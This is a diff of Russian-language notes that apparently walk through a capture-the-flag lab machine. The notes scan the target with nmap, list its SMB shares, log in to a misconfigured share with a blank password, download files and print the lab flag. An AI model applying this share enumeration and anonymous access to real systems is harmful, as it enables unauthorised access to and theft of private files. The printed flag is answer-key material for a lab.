@@ -1,39 +1,149 @@
 *** DANCING ***
 
-SMB - Send Message Block 
 
+	### DETECTION
+	Обнаружение
 	
-	@ pacman -S smbclient samba // SMB клиент для подключения к общей папке
+		@ sudo nmap -sV <target_ip>
+		
+			135/tcp open  msrpc         Microsoft Windows RPC
+			139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+			445/tcp open  microsoft-ds?
+		
+		- Port 445 is used by newer versions of SMB
+		
+			# 445 используется службой SMB
 
-		# так как файлов конфигурации клиента smb не предоставляется
-		его нужно скачать с гит-репозитория:
+
+
+	### SMB - Send Message Block 
+	
+		@ pacman -S smbclient samba // SMB клиент для подключения к общей папке
+
+			# так как файлов конфигурации клиента smb не предоставляется
+			его нужно скачать с гит-репозитория:
 			
 			https://git.samba.org/samba.git/?p=samba.git;a=blob_plain;f=examples/smb.conf.default;hb=HEAD
 
-	@ mv example_samba.smb.conf /etc/samba/smb.conf
+		@ mv example_samba.smb.conf /etc/samba/smb.conf
 
-	@ systemctl start smb
+		@ systemctl start smb
 
-	---
+		---
 
-	@ smbclient <ip> -L 
 
-		WorkShares Disk
-
-	@ smbclient //<ip>/WorkShares
+	### Enumeration
+	Перечисление
 		
-		~ ls 
-			
-			Any.D
-		
-		~ cd Any.D
-			
-		~ ls 
-			
-			flag.txt
+		- Smbclient попытается подключиться к удаленному хосту и проверить, 
+		требуется ли какая-либо аутентификация. Если есть, он попросит вас
+		ввести пароль для вашего локального имени пользователя. Мы должны 
+		принять это к сведению. Если мы не укажем конкретное имя пользователя 
+		для smbclient при попытке подключения к удаленному хосту, он просто 
+		будет использовать имя пользователя вашего локального компьютера. Это 
+		тот, с которым вы сейчас вошли в свою виртуальную машину. Это связано с 
+		тем, что для аутентификации SMB всегда требуется имя пользователя, 
+		поэтому, не указывая его явно для попытки входа в систему, ему просто 
+		нужно будет передать ваше текущее локальное имя пользователя, чтобы 
+		избежать ошибки протокола.
 
-		~ get flag.txt
+		- Тем не менее, давайте использовать наше локальное имя пользователя, 
+		поскольку мы не знаем о каких-либо удаленных именах пользователей,
+		присутствующих на целевом хосте, с которыми мы потенциально могли бы 
+		войти в систему. Далее, после этого, нам будет предложено ввести
+		пароль. Этот пароль связан с именем пользователя, которое вы ввели ранее. 
+		Гипотетически, если бы мы были легитимным удаленным пользователем, 
+		пытающимся войти на свой ресурс, мы бы знали свое имя пользователя и 
+		пароль и нормально вошли в систему, чтобы получить доступ к нашему 
+		общему ресурсу. В этом случае у нас нет таких учетных данных, поэтому мы 
+		попытаемся выполнить одно из следующих действий:
+			
+			# Guest authentication
+			Гостевая аутентификация
 
-	@current_dir: cat flag.txt
+			# Anonymous authentication
+			Анонимгная аутентификация
 
+		- При попытке авторизации используем пустой пароль и увидим файлы,
+		хранящиеся в общем ресурсе
+			
+
+
+			@ smbclient <ip> -L 
+
+				ADMIN$          Disk      Remote Admin
+				C$              Disk      Default share
+				IPC$            IPC       Remote IPC
+				WorkShares 		Disk
+
+	### FOOTHOLD
+	Плацдарм
+
+		- Мы попробуем подключиться к каждой из общих папок, кроме IPC$
+		поскольку он не доступен для просмотра. Используем пустой пароль:
+
+			@ smbclient \\\\10.129.245.5\\ADMIN$
+			Password for [MYGROUP\mwuckert]:
+			tree connect failed: NT_STATUS_ACCESS_DENIED
+			
+				# NT_STATUS_ACCESS_DENIED нет надлежащих учетных данных для
+				подключения к этому ресурсу
+
+			@ smbclient \\\\10.129.245.5\\С$
+			Password for [MYGROUP\mwuckert]:
+			tree connect failed: NT_STATUS_ACCESS_DENIED
+
+				# тоже самое 
+
+			
+			@ smbclient \\\\10.129.245.5\\Workshares
+			Password for [MYGROUP\mwuckert]:
+			smb: \> 
+				
+				# Успех Общий ресурс SMB был плохо настроен, что позволило нам 
+				войти в систему без соответствующих реквизитов для входа
+			
+			@ smb: \> help
+				
+				# Из вывода видно, что большинство команд UNIX - подобные 
 	
+		- Используем команду ls
+
+			@ smb: \>  ls 
+			
+				Amy.J				 D        0  Mon Mar 29 12:08:24 2021
+				James.P              D        0  Thu Jun  3 11:38:03 2021
+		
+			@ smb: \> cd Amy.J\
+			@ smb: \> ls
+
+				worknotes.txt        A       94  Fri Mar 26 14:00:37 2021
+
+			@ smb: \> get worknotes.txt
+				
+				getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt 
+				(0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+
+			@ smb: \> cd ..
+			@ smb: \> cd James.P\
+			@ smb: \> ls
+				
+				flag.txt             A       32  Mon Mar 29 12:26:57 2021
+
+			@ smb: \> get flag.txt
+				
+				getting file \James.P\flag.txt of size 32 as a 
+				(0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+
+					
+		- Как только оболочка SMB будет уничтожена, мы сможем прочитать два 
+		эксфильтрованных документа
+			
+			# worknotes.txt
+
+			# flag.txt 
+
+		@ cat flag.txt 
+			
+			5f61c10dffbc77a704d76016a22f1664
+
